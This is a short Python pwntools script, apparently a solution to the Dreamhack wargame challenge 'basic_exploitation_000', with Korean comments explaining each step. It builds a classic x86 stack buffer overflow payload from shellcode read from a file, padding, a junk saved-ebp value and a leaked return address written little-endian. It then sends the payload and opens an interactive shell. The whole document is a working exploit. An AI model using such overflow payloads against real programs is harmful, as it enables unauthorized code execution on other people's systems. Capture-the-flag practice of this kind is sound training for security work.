from pwn import *
import os
import binascii

p = process("./basic_exploitation_000")
#p = remote('host1.dreamhack.games', 17124)
gdb.attach(p)

data = p.recvuntil(')')

f = open("save.bin", "rb")
filesize = os.path.getsize("save.bin")
print(filesize)

payload=f.read()
f.close()
payload+=b'\x41'*(0x80-filesize)
#leave명령어의 pop ebp부분에 쓰레기 값을 넣는다.
payload+=b'\x41'*4  #x86이기 때문에 4바이트 크기 주소이다
#scanf는 거꾸로 저장하기 때문에 주소를 거꾸로 저장해야 한다.
returnaddress=binascii.unhexlify(data[9:17])
returnaddress=returnaddress[::-1]
payload+=returnaddress

print(payload)

raw_input()

p.sendline(payload)

p.interactive()